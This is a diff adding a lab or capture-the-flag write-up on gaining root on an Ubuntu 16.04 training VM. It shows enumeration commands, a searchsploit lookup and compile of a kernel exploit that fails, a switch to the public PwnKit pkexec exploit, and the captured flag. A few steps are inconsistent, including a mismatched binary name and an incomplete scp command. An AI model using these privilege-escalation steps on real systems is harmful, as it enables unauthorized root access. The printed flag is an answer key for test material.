@@ -1,0 +1,93 @@
+Questions 2
+Capstone Exercise: Connect to VM 2 with the provided credentials and gain a root shell by abusing a different kernel vulnerability.
+
+HINT
+Enumerate the version of the system (Command shown in Listing 5).
+Check SUID binaries (Command shown in Listing 20) and their versions.
+Search for vulnerable exploits based on the discovered versions.
+Flag is located in the /root/flag.txt.
+
+ssh joe@192.168.155.216
+
+joe@ubuntu-privesc:~$ uname -a
+Linux ubuntu-privesc 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+joe@ubuntu-privesc:~$ arch
+x86_64
+joe@ubuntu-privesc:~$ cat /etc/issue
+Ubuntu 16.04.4 LTS \n \l
+
+# Check the SUID 
+find / -perm -u=s -type f 2>/dev/null
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/sudo
+/usr/bin/newuidmap
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/pkexec
+/bin/su
+/bin/fusermount
+/bin/ping
+/bin/ntfs-3g
+/bin/mount
+/bin/umount
+/bin/ping6
+
+cat /etc/os-release
+NAME="Ubuntu"
+VERSION="16.04.4 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.4 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+
+
+searchsploit "linux kernel Ubuntu 16.04.4"
+...
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation            | linux/local/44298.c
+...
+
+searchsploit -m 44298
+https://www.exploit-db.com/exploits/44298
+
+# Lets upload payload to victim machine
+scp 44298.c joe@192.168.155.216:     
+
+# Generate the payload
+gcc 44298.c -o 44298
+file 44298
+cxk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ea99dabe91521a1f95b6ab4fa1dadd0e58c9af73, for GNU/Linux 3.2.0, not stripped
+
+joe@ubuntu-privesc:~$ ./44298
+error: Operation not permitted
+
+# Based on the Discord hint we can focus on exploiting the /usr/bin/pkexec
+https://github.com/ly4k/PwnKit
+chmod +x ./PwnKit
+
+# Upload the payload
+scp joe@192.168.155.216:
+
+./Pwnkit
+root@ubuntu-privesc:~# cat flag.txt
+OS{d97659302bad5f282e06ed3201f68eff}
+
+# Should consider...
+searchsploit "pkexec"  
+...
+Linux Kernel 4.10 < 5.1.17 - 'PTRACE_TRACEME' pkexec Local Privilege Escalation   | linux/local/47163.c
+...
